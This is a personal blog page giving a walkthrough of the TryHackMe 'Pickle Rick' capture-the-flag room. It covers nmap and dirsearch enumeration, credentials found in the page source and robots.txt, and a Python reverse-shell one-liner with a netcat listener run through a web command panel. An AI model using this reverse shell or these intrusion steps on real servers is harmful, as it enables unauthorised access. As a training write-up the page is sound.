@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="Pickle Rick">
+<meta itemprop="description" content="Pickle Rick is a Rick and Morty themed challenge that requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a picke. No information related to the show is required.
+  On the first page, there is nothing worth looking at. I tried clicking around the picture a bit to see if they lead to a link but nothing of that sort.">
+<meta itemprop="datePublished" content="2021-11-24T20:23:56&#43;05:30" />
+<meta itemprop="dateModified" content="2021-11-24T20:23:56&#43;05:30" />
+<meta itemprop="wordCount" content="938">
+
+
+
+<meta itemprop="keywords" content="tryhackme," /><meta property="og:title" content="Pickle Rick" />
+<meta property="og:description" content="Pickle Rick is a Rick and Morty themed challenge that requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a picke. No information related to the show is required.
+  On the first page, there is nothing worth looking at. I tried clicking around the picture a bit to see if they lead to a link but nothing of that sort." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://aurumnpegasus.github.io/website/posts/pickle_rick/" />
+<meta property="article:published_time" content="2021-11-24T20:23:56+05:30" />
+<meta property="article:modified_time" content="2021-11-24T20:23:56+05:30" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Pickle Rick"/>
+<meta name="twitter:description" content="Pickle Rick is a Rick and Morty themed challenge that requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a picke. No information related to the show is required.
+  On the first page, there is nothing worth looking at. I tried clicking around the picture a bit to see if they lead to a link but nothing of that sort."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/website/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/website/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/website/favicon-16x16.png">
+	<link rel="manifest" href="/website/site.webmanifest">
+	<link rel="mask-icon" href="/website/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/website/favicon.ico">
+
+	<title>Pickle Rick</title>
+	<link rel="stylesheet" href="https://aurumnpegasus.github.io/website/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-198727091-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-198727091-1');
+</script>
+
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://aurumnpegasus.github.io/website/">Shivansh Subramanian</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://aurumnpegasus.github.io/website/posts/">Posts</a>
+				<a href="https://aurumnpegasus.github.io/website/about-hugo/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="mailto:subramanian.shivansh@gmail.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://instagram.com/shivansh._.21/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/AurumnPegasus" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://aurumnpegasus.github.io/website/posts/">Posts</a></li>
+			<li><a href="https://aurumnpegasus.github.io/website/about-hugo/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Nov 24, 2021</span></div>
+				<h1>Pickle Rick</h1>
+			</header>
+			<div class="content">
+				<p>Pickle Rick is a Rick and Morty themed challenge that requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a picke. No information related to the show is required.</p>
+<figure>
+    <img src="https://i.imgur.com/Wdm7hYh.png"/> 
+</figure>
+
+<p>On the first page, there is nothing worth looking at. I tried clicking around the picture a bit to see if they lead to a link but nothing of that sort. Next step was to inspect element and view the source. On doing so the very first thing visible was:</p>
+<figure>
+    <img src="https://i.imgur.com/yB5T36w.png"/> 
+</figure>
+
+<p>As we can see, the username is important and we just keep that in mind.</p>
+<pre><code>Username: R1ckRul3s
+</code></pre><p>We do not see any other useful information via the inspect element. Next step, enumeration. First, we try to do it using <code>nmap</code> which gives us the ports which are open</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -A &lt;ip address&gt;
+</code></pre></div><p>and you get the output as:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-24 20:54 IST
+Nmap scan report for 10.10.191.134
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:26:28:e2:08:ac:c3:90:c0:89:05:f1:a0:13:25:bd (RSA)
+|   256 ee:03:58:01:26:f9:78:ce:44:8a:12:01:f6:83:ba:1f (ECDSA)
+|_  256 c8:ce:f3:b3:65:32:cd:20:60:24:f2💿63:eb:bc:06 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.26 seconds
+</code></pre></div><p>As you can see, only 2 ports are open, 22 and 80. I tried going to both of them by <code>&lt;ip address&gt;/&lt;port num&gt;</code> but there was nothing useful out there. Still a good thing to know.</p>
+<p>Next up, we try to enumerate better. dirsearch (<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>) is a really cool tool which you can download which can brute force directories, files etc via command-line in the specified webservers. Once you have installed it in your system just type in:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 diresearch.py -u http://&lt;ip adress&gt;
+</code></pre></div><p>It will take about 2-3 minutes to get the output.</p>
+<figure>
+    <img src="https://i.imgur.com/wZ8bNlH.png"/> 
+</figure>
+
+<p>Now, there are a lot of files that it has shown, most of which are hidden and hence unimportant. The ones may be important are the ones which are highlighted by the tool, hence we start checking them out. First up, lets go to the assets directory mentioned.</p>
+<figure>
+    <img src="https://i.imgur.com/hwpCfxv.png"/> 
+</figure>
+
+<p>Honestly, this was a bit dissapointing, there was nothing of use here :p. If you want go check out all the different files mentioned and you would probably come to the same conclusion.
+Next up, lets go check out the <code>index.html</code>. Uh well, that just takes us back to the home page. Next one. <code>login.php</code>. This takes us to a login page! Remember the username we found in the source? This might be where we need to use it! Now we need to figure out the password. I checked the source code of this page as well and found nothing interesting in it. Lets go to the next page, <code>robots.txt.</code></p>
+<p>Boom! We find <code>&lt;password&gt;</code> written on this page! Now lets try to put that in as credentials and see where this leads us.</p>
+<p>We come on to <code>portal.php</code> which shows us a command pannel! How exciting. Go around the website a bit, click on different tabs. Nothing of use is seen there either. So the main key to solving this puzzle is via the command pannel. Try typing in <code>ls</code> in the command and see the answers.</p>
+<figure>
+    <img src="https://i.imgur.com/GXGKWRQ.png"/> 
+</figure>
+
+<p>This is nice! there are two files which immediately look pretty interesting, <code>Sup3rS3cretPickl3Ingred.txt</code> and <code>clue.txt</code>. Lets check them out by <code>cat</code>.</p>
+<p>If you did try out the command <code>cat</code>, you probably hit a wall telling you that the command has been disabled and you must try some other way to retrieve the files. Now, simple google searches would probably reveal multiple different methods of displaying the files without using <code>cat</code> at all, but since that is against the spirit of the room I will skip over that :p</p>
+<p>So we have a command line where the website is not allowing us to use some commands. Lets see if it allows us to use python to get the reverse shell on our temrinal. Try typing in <code>python</code> or <code>python3</code>. You would observe that it does not allow <code>python</code> but allows <code>python3</code>. Boom, now we just need to execute the command to get the reverse shell.</p>
+<p>Here is a cheatsheet displaying different reverse shell commands: <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<p>For the python one, just remember that the &lsquo;attackers ip&rsquo; is our ip adress, which you can easily google on how to get. And specify any port that you want to. Before executing the command, just type in:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp &lt;port number&gt;
+</code></pre></div><p>Let this command run in your terminal and copy the following as mentioned in the cheatsheet:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;YOUR IP&gt;&#34;,&lt;PORT NUMBER&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><p>Type this in the command line in the website and you would see the shell get connected in your terminal. 10.17.9.4</p>
+<figure>
+    <img src="https://i.imgur.com/MUbaeGp.png"/> 
+</figure>
+
+<p>Well, now our cat works! Just <code>cat</code> out the <code>Sup3rSrcretPickl3Ingred.txt</code> file and you will have the first answer. Next up, <code>cat</code> the <code>clue.txt</code>. This will tell you to just look around the file structures for different text files.</p>
+<p>Honestly, the &ldquo;hacking&rdquo; part of the room is done here, now you just need to find the files which is easy enough. I will give you some hints to do that, but imo there is no need for more explanations.</p>
+<p>For second clue: check out the home directory, might find something interesting there :p
+For third clue: check out the root directory using sudo command!</p>
+<p>And boom, you are done!</p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://aurumnpegasus.github.io/website/tags/tryhackme">tryhackme</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>938 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-11-24 20:23 &#43;0530</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="https://aurumnpegasus.github.io/website/posts/fast_multiplication/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Fast Multiplication</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://aurumnpegasus.github.io/website/">Shivansh Subramanian</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://aurumnpegasus.github.io/website/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"> </script>
+	</footer>
+
+
+
+	<script src="https://aurumnpegasus.github.io/website/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-198727091-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-198727091-1');
+</script>
+
+</body>
+
+</html>
